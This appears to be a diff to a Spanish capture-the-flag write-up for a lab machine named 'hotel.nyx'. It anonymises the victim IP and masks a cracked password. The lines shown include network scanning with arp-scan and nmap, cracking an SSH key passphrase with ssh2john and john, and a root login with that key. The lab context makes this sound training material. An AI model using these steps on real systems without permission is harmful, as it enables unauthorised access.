@@ -5,11 +5,11 @@ Arp scan
 
 ```bash
 arp-scan -I eth0 --localnet
-192.168.200.26
+(Ip-Victima)
 ```
 
 ```bash
-nmap -p 22,80 -sS -sC -sV -n -Pn 192.168.200.26 -oN nmap
+nmap -p 22,80 -sS -sC -sV -n -Pn (Ip-Victima) -oN nmap
 ```
 
 - 22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
@@ -23,7 +23,7 @@ Así que subiremos `hotel.nyx` al `/etc/hosts`.
 
 ```bash
 nano /etc/hosts
-192.168.200.26    hotel.nyx
+(Ip-Victima)    hotel.nyx
 ```
 
 Ahora procedemos a hacer fuzzing, pero no encontramos nada nuevo. Decidimos hacer fuzzing de subdominios.
@@ -118,9 +118,9 @@ Ahora descargamos `id_rsa2`, cambiamos el nombre a `id_rsa`, lo crackeamos con j
 ```bash
 ssh2john id_rsa2 > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
-super1
+s****1
 chmod 600 id_rsa
 ssh -i id_rsa root@(ip_victima)
 ```
-
+Y ya entramos como root :D
 Y ya entramos como root :D
